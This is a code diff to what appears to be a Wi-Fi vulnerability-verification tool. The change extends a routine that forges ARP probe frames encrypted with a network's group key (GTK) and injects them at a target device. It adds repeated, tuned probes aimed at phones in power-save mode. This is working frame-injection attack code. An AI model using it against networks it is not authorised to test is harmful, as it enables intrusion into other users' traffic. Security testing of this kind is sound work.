@@ -138,6 +138,17 @@ def parse_args() -> argparse.Namespace:
                         "the probe, used to learn the AP's current PN. "
                         "Default 1.5. If no AP broadcasts arrive in this "
                         "window we fall back to a safe-high default PN.")
+    g.add_argument("--probe-count", type=int, default=1,
+                   help="Number of probe injections to send. Default 1 "
+                        "(single-shot). Bump to e.g. 10 against targets "
+                        "in Wi-Fi power-save (iPhones, recent Android) "
+                        "where a single frame may land in an RX-off "
+                        "window. Each probe uses a unique sequential PN.")
+    g.add_argument("--probe-interval", type=float, default=0.1,
+                   help="Seconds between successive probe injections. "
+                        "Default 0.1. Only relevant when --probe-count > 1. "
+                        "Pick a value shorter than the target's typical "
+                        "PSM sleep cycle (~100-300ms for phones).")
     g.add_argument("--pcap",
                    help="Path to a pcap file. Frames received on the "
                         "monitor iface during the sample window plus the "
@@ -369,20 +380,47 @@ def do_verify(args, *, mon_iface: str, atexit_state: dict) -> int:
                             pdst=args.target_ip)
                 plain = build_dot11_arp_plain(ap_mac=keys.bssid,
                                               arp_layer=probe)
-                frame = encrypt_dot11_with_gtk(plain,
-                                               gtk=bytes.fromhex(keys.gtk_hex),
-                                               pn=probe_pn,
-                                               gtk_idx=keys.gtk_idx)
 
-                print(f"[+] Probing {args.target_ip} from {probe_src}...")
-                # Wrap with RadioTap so what's transmitted matches what
-                # we save to pcap (the sniffer's RX frames also have one).
-                tx = RadioTap() / frame
-                sendp(tx, iface=mon_iface, verbose=False)
-                if pcap_writer is not None:
-                    pcap_writer.write(tx)
+                if args.probe_count == 1:
+                    print(f"[+] Probing {args.target_ip} from {probe_src}...")
+                else:
+                    print(f"[+] Probing {args.target_ip} from {probe_src} "
+                          f"({args.probe_count} probes "
+                          f"@ {args.probe_interval:.2f}s, "
+                          f"PN=0x{probe_pn:x}+i)...")
 
-                reply = watcher.wait_for_reply(args.target_ip, timeout=2.5)
+                inject_start = time.monotonic()
+                for i in range(args.probe_count):
+                    frame = encrypt_dot11_with_gtk(
+                        plain,
+                        gtk=bytes.fromhex(keys.gtk_hex),
+                        pn=probe_pn + i,
+                        gtk_idx=keys.gtk_idx,
+                    )
+                    # Wrap with RadioTap so what's transmitted matches
+                    # what we save to pcap (the sniffer's RX frames also
+                    # have one).
+                    tx = RadioTap() / frame
+                    sendp(tx, iface=mon_iface, verbose=False)
+                    if pcap_writer is not None:
+                        pcap_writer.write(tx)
+                    if i < args.probe_count - 1:
+                        time.sleep(args.probe_interval)
+
+                # Wait up to 2.5s after the last probe for any reply.
+                # Look at candidates from inject_start onward so a reply
+                # that arrived mid-injection isn't missed.
+                reply = None
+                deadline = time.monotonic() + 2.5
+                while time.monotonic() < deadline:
+                    window = time.monotonic() - inject_start
+                    matching = [c for c in
+                                watcher.candidates_in_window(window)
+                                if c.psrc == args.target_ip]
+                    if matching:
+                        reply = matching[0]
+                        break
+                    time.sleep(0.05)
                 print()
                 print("================ Verify result ================")
                 if reply is None:
